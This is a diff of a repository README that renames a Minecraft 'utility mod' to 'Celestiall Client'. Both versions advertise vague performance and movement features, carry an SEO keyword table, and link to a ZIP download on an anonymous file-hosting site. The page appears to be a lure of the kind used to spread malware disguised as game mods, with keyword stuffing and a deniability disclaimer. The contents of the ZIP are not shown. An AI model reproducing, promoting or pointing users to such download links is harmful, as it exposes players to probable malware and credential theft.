@@ -1,77 +1,76 @@
-# 🧱 Minecraft Utility Mod 2025 | Advanced Performance & Gameplay Enhancer 🛡️
+# 🌌 Celestiall Client — Precision Utility Client for Minecraft (2025 Build) ⚙️
 
-![Minecraft Utility](https://img.shields.io/badge/Minecraft-Enhancer-blue) ![Gameplay Boost](https://img.shields.io/badge/Performance-Tools-green) ![Updated](https://img.shields.io/badge/Last%20Update-May%202025-orange)
+![Client Type](https://img.shields.io/badge/Client-Utility-blue) ![FPS Boost](https://img.shields.io/badge/Performance-Enhanced-green) ![Release](https://img.shields.io/badge/Build-May%202025-orange)
 
-Enhance your Minecraft experience with this **discreet utility mod** designed for smooth performance and extra control. 🚀  
-Perfect for competitive players and enthusiasts who want more from their gameplay while staying within personal limits.
-
----
-
-## ✨ Features
-
-🔹 **Enhanced Movement Mechanics**  
-Precision tweaks for sprinting, strafing, and parkour fluidity.
-
-🔹 **Rendering Optimizations**  
-FPS boosters, custom shaders, and view distance tweaks.
-
-🔹 **Customizable HUD Elements**  
-Minimalistic overlays for coordinates, potion effects, and armor status.
-
-🔹 **Utility Keybinds**  
-Quick access to essential actions like auto-sprint, smooth zoom, and inventory tweaks.
-
-🔹 **Configurable Profiles**  
-Save and switch between custom gameplay setups with ease.
+**Celestiall Client** is a focused and lightweight enhancement layer for Minecraft — crafted for users who value **efficiency**, **clarity**, and **precise control**.  
+Built without clutter. Engineered for stability. Invisible until you need it.
 
 ---
 
-## 🛠️ How It Works
+## ✨ Core Features
 
-1️⃣ Download the utility mod package and install it with your preferred Minecraft launcher.  
-2️⃣ Configure keybinds and HUD elements to fit your playstyle.  
-3️⃣ Enable performance tweaks for smoother gameplay.  
-4️⃣ Enjoy enhanced control and responsiveness in-game. 🎮
+🔹 **Refined Movement Handling**  
+Adjustments to input responsiveness for smoother sprinting, midair transitions, and directional control.
 
----
+🔹 **Visual Streamlining**  
+FPS stabilization, view distance filters, and suppression of unnecessary visual load.
 
-## 📥 Download Now
+🔹 **Minimalist Overlay System**  
+Position, armor state, potion effects, and inventory details — visible only when useful.
 
-🔗 **[Download Minecraft Utility Mod (ZIP)](https://files.catbox.moe/6jpwyn.zip)**
+🔹 **Fast-Access Keybinds**  
+Activate actions like smooth zoom, auto-sprint, and smart inventory with clean bindings.
 
-> 📝 Lightweight & modular — designed for personal use and optimization.
-
----
-
-## 📊 Why Use This Utility?
-
-✅ Boosts in-game performance without heavy resource usage  
-✅ Improves gameplay control for parkour, PvP, and exploration  
-✅ Customizable visuals for cleaner interface  
-✅ Made for players who value precision & smoothness
+🔹 **Custom Profile Switching**  
+Switch between gameplay templates on the fly — PvP, parkour, exploration, and more.
 
 ---
 
-## 🛡️ Disclaimer
+## 🛠️ Setup Guide
 
-> This repository is for **educational and personal enhancement purposes only**.  
-> Use responsibly and respect the rules of the servers you play on.  
-> The authors are not responsible for misuse or violations.
-
----
-
-## ⭐ Like this project? Star the repo and stay tuned for updates! ⭐
+1. Download the Celestiall Client ZIP from the link below.  
+2. Unpack and install through your preferred Minecraft loader (Fabric, Forge, or others).  
+3. Tweak visuals, bindings, and HUD elements to suit your style.  
+4. Launch the game and feel the difference — leaner, sharper, cleaner. 🎮
 
 ---
 
-## 📈 SEO Keywords
+## 📥 Download
 
-| Optimization Keywords               | Gameplay Keywords              |
+🔗 **[Download Celestiall Client (ZIP)](https://files.catbox.moe/88ai75.zip)**
+
+> Compact by design. Functional by principle. Free of bloat.
+
+---
+
+## 📊 Why Celestiall?
+
+✔ Reduces visual noise and system load  
+✔ Improves control fidelity across all gameplay types  
+✔ Clean integration — no overlays unless activated  
+✔ Built for personal optimization, not flashiness
+
+---
+
+## 🛡️ Responsibility Notice
+
+> Celestiall Client is provided strictly for **personal performance enhancement**.  
+> Do not use in violation of server policies or gameplay terms.  
+> The developers take no responsibility for unauthorized use.
+
+---
+
+## ⭐ Found it useful? Star this repository and follow future updates. ⭐
+
+---
+
+## 🔍 Technical Tags
+
+| Performance Enhancements            | Gameplay Tools                |
 |-------------------------------------|-------------------------------|
-| Minecraft FPS Booster               | Minecraft Utility Mod         |
-| Performance Enhancer for Minecraft  | Advanced Movement Tweaks      |
-| Custom Minecraft HUD                | Smooth PvP Controls           |
-| Minimalistic Minecraft Overlays     | Parkour Fluidity Mod          |
-| In-game Optimization Tools          | Minecraft Keybind Enhancer    |
-| Render Tweaks Minecraft             | Discreet Gameplay Tools       |
-| Lightweight Minecraft Addons        | Personal Use Enhancer         |
+| Minecraft FPS Stability             | Precision Input Handling      |
+| Rendering Efficiency Toolkit        | Keybind Management System     |
+| Visual Filter System                | Lightweight UI Layer          |
+| Input Smoothing Engine              | Customizable HUD Components   |
+| Low-Latency Client Tools            | Exploration Assist Features   |
+| Clean Interface Enhancer            | Toggle-Based Utility Actions  |
